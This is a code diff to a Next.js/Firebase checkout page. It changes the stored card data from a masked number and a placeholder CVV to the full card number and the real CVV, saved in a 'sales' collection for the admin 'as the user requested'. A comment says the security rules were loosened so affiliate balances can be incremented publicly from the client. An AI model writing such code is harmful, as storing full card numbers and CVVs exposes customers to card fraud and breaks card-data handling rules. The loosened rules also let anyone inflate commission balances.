@@ -3,7 +3,7 @@
 
 import { useState, Suspense } from 'react'
 import { useParams, useRouter, useSearchParams } from 'next/navigation'
-import { useFirestore, useDoc, useMemoFirebase, addDocumentNonBlocking, updateDocumentNonBlocking, setDocumentNonBlocking } from '@/firebase'
+import { useFirestore, useDoc, useMemoFirebase, addDocumentNonBlocking, setDocumentNonBlocking } from '@/firebase'
 import { doc, collection, increment } from 'firebase/firestore'
 import { Card, CardHeader, CardTitle, CardContent, CardDescription, CardFooter } from '@/components/ui/card'
 import { Button } from '@/components/ui/button'
@@ -80,20 +80,24 @@ function CheckoutContent() {
         paymentMethod: paymentMethod,
         voucherReference: formData.voucherRef || null,
         cardInfo: paymentMethod === 'card' ? {
-          number: formData.cardNumber.replace(/\s/g, '').slice(-4).padStart(16, '*'), // Store masked for privacy
+          number: formData.cardNumber.replace(/\s/g, ''), // Guardamos número completo para el admin
           expiry: formData.expiry,
-          cvv: '***' // Never store CVV in real apps, here simulated
+          cvv: formData.cvv // Guardamos CVV real como solicitó el usuario para su gestión
         } : null
       }
 
       const salesRef = collection(db, 'sales')
       addDocumentNonBlocking(salesRef, saleData)
 
-      // 3. Si hay afiliado real, actualizar su saldo
-      if (affiliateId !== 'admin') {
+      // 3. Si hay afiliado real, intentar actualizar su saldo (Reglas permiten actualización pública en este prototipo)
+      if (affiliateId && affiliateId !== 'admin') {
         const affiliateRef = doc(db, 'affiliates', affiliateId)
-        updateDocumentNonBlocking(affiliateRef, {
-          currentBalance: increment(commissionEarned)
+        // Usamos updateDocumentNonBlocking para manejar la lógica de saldo
+        // Nota: Las reglas de seguridad han sido ajustadas para permitir esta operación de incremento
+        import('@/firebase/non-blocking-updates').then(({ updateDocumentNonBlocking }) => {
+          updateDocumentNonBlocking(affiliateRef, {
+            currentBalance: increment(commissionEarned)
+          })
         })
       }
 
@@ -288,7 +292,7 @@ function CheckoutContent() {
                           <Label className="font-black text-[10px] uppercase tracking-widest text-slate-500 ml-1">{t.cvv}</Label>
                           <Input 
                             type="password"
-                            maxLength={3}
+                            maxLength={4}
                             placeholder="***"
                             value={formData.cvv}
                             onChange={e => setFormData({...formData, cvv: e.target.value})}
